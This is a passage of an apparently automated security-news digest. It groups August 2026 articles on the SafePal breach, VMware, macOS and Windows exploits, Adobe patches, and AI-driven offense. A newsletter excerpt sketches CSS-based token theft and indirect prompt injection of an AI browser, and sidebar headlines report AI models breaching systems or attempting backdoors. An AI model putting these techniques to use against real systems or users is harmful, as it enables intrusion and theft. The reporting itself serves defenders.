application, and move your remaining assets to the new wallet immediately,” SafePal notes. According to the company, it started investigating the incident after receiving a report in May, but treated it as an isolated case. It later discovered that a bug in its system resulted in order-related data being stored for much longer than intended. “To resolve this conclusively, we began a full review and rebuild of our order-processing pipeline in July, and confirmed the root cause mentioned during the investigation,” it notes . The company says it has addressed the vulnerability exploited in the attack, tightened the retention period for order-related information, identified and notified the impacted people, contacted partners to ensure the issue did not propagate, and retained a third-party security firm to investigate. SafePal says it has “identified and taken down over 30 fraudulent websites and phishing links tied to the scam activities, with continued active monitoring for new ones.” The company urges customers who might have experienced a financial loss related to the incident to contact it and provide relevant details, as it has been contacting on-chain asset-tracing specialists. “Note that this does not represent any admission of liability or commitment to compensation; our focus at this stage is supporting recovery and ongoing investigations,” SafePal notes. Related: Fortune 500 Companies Hit in Azure Data Theft Campaign Related: Trivy, Not LiteLLM Behind the 2,500 Org Compromise Related: Over 1,000 Charities Hit by Beacon CRM Data Breach Related: 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 1.6 Million Likely Impacted by RingCentral Data Breach 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Adobe Commerce Bug Targeted Immediately After Disclosure WordPress 7.0.4 Patches Remote Code Execution Vulnerability Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Critical VMware vCenter Vulnerability in Attackers’ Crosshairs Latest News 680,000 Impacted by French Tax Authori
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 40,000 Impacted by SafePal Data Breach
  - Published: 2026-08-17T09:37:06+00:00
  - Link: https://www.securityweek.com/40000-impacted-by-safepal-data-breach/
  - Summary: Hackers exploited a vulnerability in the order-tracking function of a plugin to access SafePal customer information. The post 40,000 Impacted by SafePal Data Breach appeared first on SecurityWeek .

### Cluster 388705e7c7 — score 9

- Title: ⚡ Weekly Recap: VMware Exploits, Windows 0-Day, MCP Attacks, Browser Hijacks and More
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-17T13:23:51+00:00
- Link: https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng, ransomware_extortion, supply_chain, web_shell_backdoor, zero_day
- actor_attribution: Lazarus
- affected_industries: aviation_defense, financial_services, government
- affected_products: Apple iOS/macOS, VMware
- cve_ids: CVE-2026-59310, CVE-2026-65400, CVE-2026-68820
- urgency_signals: actively_exploited, zero_day
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, zero_day, apt_espionage, web_shell_backdoor, active_exploitation
- actor_attribution: Lazarus
- affected_industries: financial_services, government, aviation_defense
- affected_products: Apple iOS/macOS, VMware
- cve_ids: CVE-2026-59310, CVE-2026-65400, CVE-2026-68820
- urgency_signals: actively_exploited, zero_day
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Summary

```
The expensive attacks are not always the clever ones. This week had plenty of proof. Exposed services got hit, old bugs found fresh use, browser sessions became attack paths, and supply-chain problems kept spreading farther than the original compromise. A lot of it came down to access that was already there and defenses that assumed nobody would look too closely. So, nothing magical. Just a
```

#### Full body

```
⚡ Weekly Recap: VMware Exploits, Windows 0-Day, MCP Attacks, Browser Hijacks and More  Ravie Lakshmanan  Aug 17, 2026 Cybersecurity / Hacking The expensive attacks are not always the clever ones. This week had plenty of proof. Exposed services got hit, old bugs found fresh use, browser sessions became attack paths, and supply-chain problems kept spreading farther than the original compromise. A lot of it came down to access that was already there and defenses that assumed nobody would look too closely. So, nothing magical. Just a lot of small openings turning into bigger problems. Here’s what stood out. ⚡ Threat of the Week Suspected China APT Behind Exploitation of New VMware Flaw — A suspected China-nexus APT is assessed to be behind the exploitation of a newly patched security flaw in VMware vCenter. The attacks involve the exploitation of CVE-2026-59310 (CVSS score: 9.8), a severe directory-traversal vulnerability in the VMware vCenter server that could be weaponized by a malicious actor to execute arbitrary code. In at least one compromised instance, the attacks led to the deployment of a backdoor and. a reverse SSH binary, with the attack ultimately leading to the deployment of Babuk-derived ransomware. "Based on the case we investigated, however, we do not believe ransomware was necessarily the primary objective," QUIRSO said. "To us, its deployment looks more like a smoke screen intended to distract from the underlying intrusion and, importantly, hinder subsequent forensic analysis by encrypting evidence. We therefore see the ransomware activity in this case as potentially serving the broader intrusion rather than being its ultimate objective." AI Adoption Is Outpacing Governance, New SANS Survey Finds Seventy-eight percent of practitioners now say AI is part of their cybersecurity strategy, up from 50% last year. Governance hasn't kept pace: just 36% have a formal AI risk program. See where 536 security professionals say programs are falling short, and what to do about it. Read the Findings ➝ 🔔 Top News Apple macOS Flaw Exploited to Drop Crypto Miner — A recently patched security flaw in Apple macOS has come under active exploitation in the wild to deploy a cryptocurrency miner. The vulnerability in question is CVE-2026-65400 (CVSS score: 9.8), a critical authentication issue impacting the Screen Sharing component that could allow an attacker already on the network to authenticate to the built-in remote desktop feature service without valid credentials. The shortcoming was addressed as part of an emergency update in macOS Tahoe 26.6.1, macOS Sequoia 15.7.9, and macOS Sonoma 14.8.9 earlier this month. The Netherlands National Cyber Security Center (NCSC-NL) said it received a report indicating active abuse of the vulnerability across multiple systems on which port 5900 was accessible from the internet. "In all these cases, root had gained access to the affected system and placed a Monero crypto miner," the agency said. Lazarus Exploits New Windows 0-Day — The North Korean threat actor known as Lazarus Group has been attributed to the zero-day exploitation of a newly patched security flaw impacting Microsoft Windows to deliver a never-before-seen backdoor targeting defense and aerospace companies across France, Germany, Brazil, and India. The activity is part of Operation Dream Job, a long-running cyber espionage and social engineering campaign orchestrated by Pyongyang-backed hackers to target professionals worldwide with fake-but-compelling job offers to steal sensitive data and install malware. The attacks have been found to exploit CVE-2026-68820 (CVSS score: 7.0), a privilege escalation flaw affecting Windows Ancillary Function Driver for WinSock ("AFD.sys") that was patched by Microsoft as part of its Patch Tuesday updates for August 2026. The attacks have been observed to deliver ForestTiger and a new backdoor called Troy. GeoServer Patches Critical Flaw Under Attack — GeoServer has released patches for a criti
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ⚡ Weekly Recap: VMware Exploits, Windows 0-Day, MCP Attacks, Browser Hijacks and More
  - Published: 2026-08-17T13:23:51+00:00
  - Link: https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
  - Summary: The expensive attacks are not always the clever ones. This week had plenty of proof. Exposed services got hit, old bugs found fresh use, browser sessions became attack paths, and supply-chain problems kept spreading farther than the original compromise. A lot of it came down to access that was already there and defenses that assumed nobody would look too closely. So, nothing magical. Just a

### Cluster c9c8258f83 — score 9

- Title: Adobe Patches Three CVSS 10.0 ColdFusion and Campaign Classic Flaws
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-12T11:13:03+00:00
- Link: https://thehackernews.com/2026/08/adobe-patches-three-cvss-100-coldfusion.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-48362

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, ddos, web_shell_backdoor
- affected_industries: retail_ecommerce, telecommunications
- affected_products: Anthropic/Claude, Azure, cPanel
- cve_ids: CVE-2026-48273, CVE-2026-48362, CVE-2026-71362, CVE-2026-71384, CVE-2026-71398
- urgency_signals: actively_exploited, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, ddos, web_shell_backdoor, active_exploitation
- affected_industries: telecommunications, retail_ecommerce
- affected_products: Anthropic/Claude, cPanel, Azure
- cve_ids: CVE-2026-48362, CVE-2026-48273, CVE-2026-71384, CVE-2026-71362, CVE-2026-71398
- urgency_signals: actively_exploited, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Adobe has shipped updates to address multiple critical security vulnerabilities impacting ColdFusion, Commerce, and Campaign Classic that, if successfully exploited, could result in arbitrary code execution and privilege escalation. The most severe of the flaws are listed below - CVE-2026-48362 (CVSS score: 10.0) - An operating system command injection vulnerability in ColdFusion that could
```

#### Full body

```
Adobe Patches Three CVSS 10.0 ColdFusion and Campaign Classic Flaws  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Web Security Adobe has shipped updates to address multiple critical security vulnerabilities impacting ColdFusion, Commerce, and Campaign Classic that, if successfully exploited, could result in arbitrary code execution and privilege escalation. The most severe of the flaws are listed below - CVE-2026-48362 (CVSS score: 10.0) - An operating system command injection vulnerability in ColdFusion that could lead to arbitrary code execution (Fixed in 2025.0.12 and 2023.0.23) CVE-2026-48273 (CVSS score: 9.9) - An eval injection vulnerability in ColdFusion that could lead to arbitrary code execution (Fixed in 2025.0.12 and 2023.0.23) CVE-2026-71384 (CVSS score: 9.6) - An incorrect authorization vulnerability in ColdFusion that could lead to an application denial-of-service (Fixed in 2025.0.12 and 2023.0.23) CVE-2026-71362 (CVSS score: 9.1) - An incorrect authorization vulnerability in Commerce that could lead to privilege escalation CVE-2026-71398 (CVSS score: 10.0) - An incorrect authorization vulnerability in Campaign Classic that could lead to arbitrary code execution (Fixed in ACC v7 7.4.4 build 9400) CVE-2026-27302 (CVSS score: 10.0) - An incorrect authorization vulnerability in Campaign Classic that could lead to arbitrary code execution (Fixed in ACC v7 7.4.4 build 9400) CVE-2026-48381 (CVSS score: 9.0) - An SQL injection vulnerability in Campaign Classic that could lead to arbitrary code execution (Fixed in ACC v7 7.4.4 build 9400) The updates for ColdFusion and Campaign Classic have a Priority 1 rating , which refers to vulnerabilities that have a higher risk of being targeted by malicious cyber attacks. It's worth noting that the Campaign Classic updates only apply to fully on-premise deployments and to the on-premise components of hybrid deployments. Adobe-hosted instances have already been remediated and require no customer action. Although there is no evidence of these flaws being exploited in the wild, administrators are recommended to install the update as soon as possible, preferably within 72 hours. The disclosure comes less than two weeks after Adobe released patches for a maximum-severity security flaw in Campaign Classic (CVE-2026-48449, CVSS score: 10.0) that could result in arbitrary code execution. Update Indications have emerged that threat actors are exploiting CVE-2026-71362, a critical flaw in Adobe Commerce and Magento Open Source, according to Sansec. "The vulnerability lets attackers switch a customer session to another customer account," the Dutch e-commerce security company said . "This gives them access to the victim's account and private customer data." (The story was updated after publication on August 13, 2026, to include additional insights from Sansec.) Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Adobe , Application Security , Code Execution , denial of service , enterprise security , Patch Management , privilege escalation , SQL Injection , Vulnerability , Web Security ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete Google Password Manager Attacks Could Let Malware Hijack Passkey-Protected Accounts New cPanel Critical Flaw Could Let Hosting Customers Run SQL as Database Root Keyv-Linked npm Worm Poisons Hundreds of Packages, Plants Claude Code and VS Code Hooks Claude Mythos 5 Tried to Backdoor a Real Open-Source Project in Testing, Then Vouched for Itself Critical Gi
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Adobe Patches Three CVSS 10.0 ColdFusion and Campaign Classic Flaws
  - Published: 2026-08-12T11:13:03+00:00
  - Link: https://thehackernews.com/2026/08/adobe-patches-three-cvss-100-coldfusion.html
  - Summary: Adobe has shipped updates to address multiple critical security vulnerabilities impacting ColdFusion, Commerce, and Campaign Classic that, if successfully exploited, could result in arbitrary code execution and privilege escalation. The most severe of the flaws are listed below - CVE-2026-48362 (CVSS score: 10.0) - An operating system command injection vulnerability in ColdFusion that could

### Cluster 20c2a82904 — score 9

- Title: SafePal Data Breach Hits Tens of Thousands of Customers
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-08-17T09:10:00+00:00
- Link: https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach, phishing_social_eng
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Apple iOS/macOS, OpenAI/ChatGPT
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, data_breach
- affected_industries: financial_services, government, manufacturing_industrial
- affected_products: Apple iOS/macOS, OpenAI/ChatGPT
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach
```

#### Full body

```
Infosecurity Magazine Home » News » SafePal Data Breach Hits Tens of Thousands of Customers SafePal Data Breach Hits Tens of Thousands of Customers News 17 August 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster The manufacturer of a popular cryptocurrency hardware wallet has told tens of thousands of its customers to be on the lookout for phishing attempts after it suffered a data breach. SafePal published an update on August 16 claiming that order information linked to 39,798 customers had been compromised in a recent incident. Customers who placed order between March 2, 2025 and April 11, 2026 are impacted. The stolen data includes names, email and shipping addresses, phone numbers and purchase details. “This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers,” SafePal clarified. “SafePal never requests, collects, processes or stores such information from customers. No evidence has been found that the incident itself compromised access to SafePal wallets or funds.” Read more on crypto breaches: Coldcard Users Lose $89m After Bitcoin Wallet Is Hacked The breach appears to have stemmed from a vulnerability in the firm’s order-tracking function for a plug-in. “Under certain conditions, the flaw allowed unauthorized access to another customer's order information. We remediated the issue upon discovery and introduced additional security measures,” SafePal explained. The firm warned customers to expect “fraudulent phone calls, emails, text messages, letters, refund offers, firmware-update requests, fake customer-support communications” and other attempts to obtain their wallet credentials or additional personal information. It said it had already taken down over 30 fraudulent websites and phishing links associated with the incident. According to screenshots posted to X , an individual has put the stolen data up for sale, although their claims have not been verified. Advice for SafePal Customers SafePal has published a dedicated page via which to report scams, and a support channel for affected customers. It issued the following advice: Never share your seed phrase, private key, or password with anyone, even if they claim to be a SafePal employee Don’t click links or scan QR codes in unsolicited emails, text messages, or letters claiming to be from SafePal Type the SafePal web address manually into the browser rather than following a redirected link, including any link that appears to come from this notice Be on the lookout for any suspicious communication or impersonation, whether by phone, post or in person Report anything suspicious, including messages, calls, letters or websites You may also like Los Angeles Public Health Department Discloses Large Data Breach News 17 June 2024 BBC Pension Scheme Breached, Exposing Employee Data News 31 May 2024 Cybersecurity Incidents Account for a Third of ICO Reports in 2020 News 4 September 2020 Over 80% of Sports Organizations Targeted by Hackers in the Last Year News 12 June 2026 Qantas Confirms 5.7 Million Customers Hit by Data Breach News 10 July 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Infostealers Harvest 1.7 Billion Credentials in Six Months News 17 August 2026 1 Novel macOS Infostealer AmnesiaStealer Spread via ClickFix News 14 August 2026 2 OpenAI Launches Two-Tier Security Access Program Alongside GPT 5.6 Cyber News 11 August 2026 3 New CISA Guide Helps Agencies Adopt SASE For Zero Trust News 25 June 2026 4 New Mirai-Based Linux Botnet ‘Evooo1Bot’ Turns Victims Into Proxies News 14 August 2026 5 vCenter Flaw Exploited Just Five Days After Disclosure News 13 August 2026 6 NIST Seeks Public Input on AI-Ready NVD Modernization News 12 August 2026 1 OpenAI Launches Two-Tier Security Access Program Alongside GPT 5.6 Cyber News 11 August 2026 2 L
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: SafePal Data Breach Hits Tens of Thousands of Customers
  - Published: 2026-08-17T09:10:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/
  - Summary: Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach

### Cluster a0547d74b2 — score 9

- Title: Unauthenticated RCE in CircleCI's MCP server: Host/Origin allowlist bypassed by any non-browser client (GHSA-xv5j-cwgj-22r4)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-17T14:14:44+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vqtjpi/unauthenticated_rce_in_circlecis_mcp_server/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/HyprWave [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Unauthenticated RCE in CircleCI's MCP server: Host/Origin allowlist bypassed by any non-browser client (GHSA-xv5j-cwgj-22r4)
  - Published: 2026-08-17T14:14:44+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vqtjpi/unauthenticated_rce_in_circlecis_mcp_server/
  - Summary: submitted by /u/HyprWave [link] [comments]

### Cluster 7029814c59 — score 9

- Title: CVE-2026-33696: From a Schema Name to RCE in n8n
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-16T13:33:02+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vpx6ku/cve202633696_from_a_schema_name_to_rce_in_n8n/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-33696

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-33696
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2026-33696
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/TradeGold6317 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: CVE-2026-33696: From a Schema Name to RCE in n8n
  - Published: 2026-08-16T13:33:02+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vpx6ku/cve202633696_from_a_schema_name_to_rce_in_n8n/
  - Summary: submitted by /u/TradeGold6317 [link] [comments]

### Cluster b1da6aaade — score 9

- Title: From Unauthenticated API to Grid Risk: A Hybrid Inverter Vulnerability Explained
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-13T15:20:01+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vndp8e/from_unauthenticated_api_to_grid_risk_a_hybrid/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
Auth Bypass. Commands over CAN Bus to internal components. Protection mechanisms disabled and configuration changes. Impact: damage connected devices, permanent DoS to the inverter itself, fines, and even risk to the lives of grid technicians. proprietary communication protocols and file formats. RX architecture reverse engineering. submitted by /u/_solid_snail [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: From Unauthenticated API to Grid Risk: A Hybrid Inverter Vulnerability Explained
  - Published: 2026-08-13T15:20:01+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vndp8e/from_unauthenticated_api_to_grid_risk_a_hybrid/
  - Summary: Auth Bypass. Commands over CAN Bus to internal components. Protection mechanisms disabled and configuration changes. Impact: damage connected devices, permanent DoS to the inverter itself, fines, and even risk to the lives of grid technicians. proprietary communication protocols and file formats. RX architecture reverse engineering. submitted by /u/_solid_snail [link] [comments]

### Cluster b7b068c390 — score 9

- Title: [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements
- Source: tl;dr sec (practitioner_analysis)
- Published: 2026-08-13T14:30:00+00:00
- Link: https://tldrsec.com/p/tldr-sec-341
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, supply_chain
- affected_products: OpenAI/ChatGPT, WordPress
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: supply_chain, ai_security
- affected_products: WordPress, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Deep dive and timeline of HF from OpenAI, Portswigger shows how CSS in webmail clients can be weaponized, GitHub's platform improvements
```

#### Full body

```
0 tl;dr sec Posts [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements Deep dive and timeline of HF from OpenAI, Portswigger shows how CSS in webmail clients can be weaponized, GitHub's platform improvements Clint Gibler August 13, 2026 Hey there, I hope you’ve been doing well! 🤔 Where do I know you from? I think one of my favorite, most hilarious life moments in recent history occurred in Vegas during Black Hat. I was at the Specter Ops happy hour, catching up with my friend Matt Johansen, who runs the great Vulnerable U newsletter, and Bryan Solari, an NCC Group friend who now runs sales for most of the security creators, including tl;dr sec. One of my colleagues comes up and joins our circle, and starts chatting. Bryan says to him, “Hmm you look really familiar, where do I know you from? I think we met last RSA.” Colleague: “errr maybe?” Bryan: “Yeah, definitely RSA. Now what party was it… was it Island?” Matt and I make eye contact, how do we tell Bryan ? Me: “Bryan that’s… Greg.” Bryan: “No maybe it was a different party, was it…?” Me: “Greg… Brockman. The President and co-founder of OpenAI.” 😂 Bryan: “Oh OK. That’s cool.” They then proceed to talk about the security creator economy and Greg asked a bunch of questions. Delightful. P.S . My colleagues Eric Wallace and Michael Dalton ’s Black Hat USA 2026 deep dive into the timeline and details of The OpenAI-Hugging Face Incident is 🔥 >500K views in a week, whoa. Eric is a super nice and sharp dude, we’ve chatted a number of times about model training, and I was impressed by my interactions with Michael during the incident, very smart guy. Sponsor 📣 Burp AT: agentic AI that thinks like a pentester, with the tools of a pentester. A professional pentest takes more than a capable model. Burp AT brings agentic AI to human-led pentesting, natively inside Burp Suite. Agents pursue the tasks you give them using Burp’s battle-hardened tools, project context, and purpose-built skills developed with PortSwigger Research. You stay in control of scope, judgment, and conclusions. Burp enforces the boundaries you set and records the work, so you can reproduce findings and stand behind the evidence. 👉 Learn more about Burp AT 👈 PortSwigger Research is one of the best in web security in my opinion, hands down. Worth checking out what they’re building 👍️ AppSec CSS:the bomb inside your inbox The blog version of Portswigger’s Gareth Heyes ’ Black Hat talk ( GitHub repo ). Gareth demonstrates how CSS in webmail clients can be weaponized to bypass sanitizers, exfiltrate tokens, spoof UI, and steal passwords across Gmail, Outlook, Fastmail, ProtonMail, and others. Gareth combines techniques like nesting attribute selectors to brute-force Medium's 12-character hex tokens, indirect prompt injection to control OpenAI's Atlas browser, and font-height oracles with animations to exfiltrate numeric tokens when CSP blocks external resources, achieving account takeover from simple copy-paste actions into draft emails. He also walks through building real-time keyloggers using select elements. TIL about Shazzer , a shared online fuzzing platform for browser behavior testing, enabling security researchers to create, share, and run fuzz tests across different browsers to discover parsing quirks, JavaScript syntax variations, and potential security issues. 💡 Web chicanery of the highest order from the Portswigger team, as expected. Exploit brokers pay $500,000 for a WordPress RCE. I found one with GPT5.6 Sol Ultra and $25 SL Cyber’s (Assetnote) Adam Kues describes using GPT 5.6 Sol Ultra with an adapted version of OpenAI's Cycle Double Cover prompt to discover a pre-authentication RCE chain in WordPress core, spending approximately $25 and 10 hours of compute time. The exploit chains a batch API validation desync bug t
```

#### Corroborating sources (1)

- **tl;dr sec** (practitioner_analysis)
  - Title: [tl;dr sec] #341 - Hugging Face Incident Black Hat Talk, CSS Bomb in your Inbox, GitHub Supply Chain Security Improvements
  - Published: 2026-08-13T14:30:00+00:00
  - Link: https://tldrsec.com/p/tldr-sec-341
  - Summary: Deep dive and timeline of HF from OpenAI, Portswigger shows how CSS in webmail clients can be weaponized, GitHub's platform improvements

### Cluster aedb17e633 — score 9

- Title: Srsly Risky Biz: Data extortion is booming. Hooray!
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-08-13T09:40:16+00:00
- Link: https://risky.biz/SRB179/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_3_analysis

#### Summary

```
Tom Uren and James Wilson talk about the cybercrime ecosystem shifting towards data theft extortion, stealing sensitive data and extracting ransoms from victims by threatening to leak it. For organisations whose reputation is very important to them, data leaks are a bigger threat than having their files locked up. They also discuss how the rise of AI makes it worth reinvigorating CISA’s Secure by Design initiative.
```

#### Full body

```
Risky Bulletin Podcast August 13, 2026 Srsly Risky Biz: Data extortion is booming. Hooray! Presented by James Wilson Technology Editor Tom Uren Policy & Intelligence Tom Uren and James Wilson talk about the cybercrime ecosystem shifting towards data theft extortion, stealing sensitive data and extracting ransoms from victims by threatening to leak it. For organisations whose reputation is very important to them, data leaks are a bigger threat than having their files locked up. They also discuss how the rise of AI makes it worth reinvigorating CISAâs Secure by Design initiative. Your browser does not support the audio element. Srsly Risky Biz: Data extortion is booming. Hooray! â¶ 0:00 / 30:48 Subscribe Brought to you by Island The Enterprise Browser
```

#### Corroborating sources (1)

- **Risky Business News** (practitioner_analysis)
  - Title: Srsly Risky Biz: Data extortion is booming. Hooray!
  - Published: 2026-08-13T09:40:16+00:00
  - Link: https://risky.biz/SRB179/
  - Summary: Tom Uren and James Wilson talk about the cybercrime ecosystem shifting towards data theft extortion, stealing sensitive data and extracting ransoms from victims by threatening to leak it. For organisations whose reputation is very important to them, data leaks are a bigger threat than having their files locked up. They also discuss how the rise of AI makes it worth reinvigorating CISA’s Secure by Design initiative.

### Cluster 228cd48aeb — score 8

- Title: AI Offense is Not Noclip Mode
- Source: TrustedSec (detection_response_operations)
- Published: 2026-08-13T04:00:00+00:00
- Link: https://trustedsec.com/blog/ai-offense-is-not-noclip-mode
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>AI doesn't let attackers walk through walls, but it makes finding the cracks more efficient. In this blog, we cut through the hype and explain what AI-driven offense really looks like and why hard controls still work.</p>
```

#### Full body

```
Blog AI Offense is Not Noclip Mode August 13, 2026 AI Offense is Not Noclip Mode Written by Justin Elze Artificial Intelligence (AI) Table of contents The Walls Are Real Reachability is the Variable Nobody Prices Why wp2shell Matters Ten Thousand Eyes Humans Are an Attack Surface Too AI Changes the Economics, Not the Requirements What Defenders Should Actually Do Persistence is Not a Skeleton Key References Everyone wants the cinematic version of offensive AI. The model finds a path nobody knew existed, ignores the controls, and lands on the objective using an attack class that did not previously exist. Noclip mode. Walk through the wall, skip the level. That framing is fun. It is also mostly wrong about the near-term risk. The practical advantage is more boring and more dangerous. AI makes it cheap to keep trying against attack paths we already understand. It can test more variations, explain why something failed, change approaches, connect findings across a codebase nobody has time to read end to end, and continue long after a human operator would have burned the engagement budget and moved on. That matters. It is also not magic, and the difference between those two statements is where most of the current commentary falls apart. The Walls Are Real Known attack paths generally have controls built around them. Conditional Access with device compliance and phishing-resistant authentication breaks a lot of credential abuse. WDAC or AppLocker in enforcement mode breaks a lot of execution. ASLR, DEP, CFG, CET, and the rest of the memory protection stack made entire exploit classes harder, less reliable, and more expensive. Segmentation limits movement. Tiered administration and LAPS limit what a foothold is worth. Rate limits, lockouts, logging, and behavioral detection still work at machine speed. A model does not reason its way past those controls because it tried hard enough. A blocked process is still blocked. A token that does not satisfy Conditional Access is still rejected. A memory corruption bug still has to survive whatever mitigations are compiled into the target. A host that cannot route to another segment does not acquire a route because someone wrote a better prompt. The problem is that almost nobody has one clean wall—a single, consistently enforced defensive boundary where the same controls apply everywhere. Instead, they have fifteen years of overlapping products, exceptions, legacy workflows, trusted paths, exclusions, stale systems, half-finished deployments, and controls enforced in one OU and left in audit mode in another. The result not exactly a wall, but a patchwork of defenses with gaps, seams, and inconsistent enforcement that attackers can work around. As I wrote in The Defensive Stack Is Exposed , the decision logic inside defensive products is increasingly part of the attack surface. Rules, thresholds, exclusions, trusted paths, and management states can now be studied together instead of one at a time. AI makes finding those seams cheaper. It can test every door, window, vent, service entrance, and badly patched section of drywall, compare versions, watch how the defensive product behaves, recover from dead ends, and keep refining until it finds the place where two controls do not quite overlap. Reachability is the Variable Nobody Prices There is another part of this conversation that keeps getting skipped: The attacker has to be able to reach the vulnerable surface. This is straightforward when the target is an unauthenticated Internet-facing application. Scan for it, send requests, and iterate without compromising anything first. Once the vulnerable component sits behind authentication, on an internal VLAN, inside a specific workflow, or behind a configuration almost nobody runs, the economics change. Now the attacker needs credentials, a foothold, routing, a particular role, a specific dependency version, or an earlier bug just to get within arm’s reach of the interesting code. That does not make t
```

#### Corroborating sources (1)

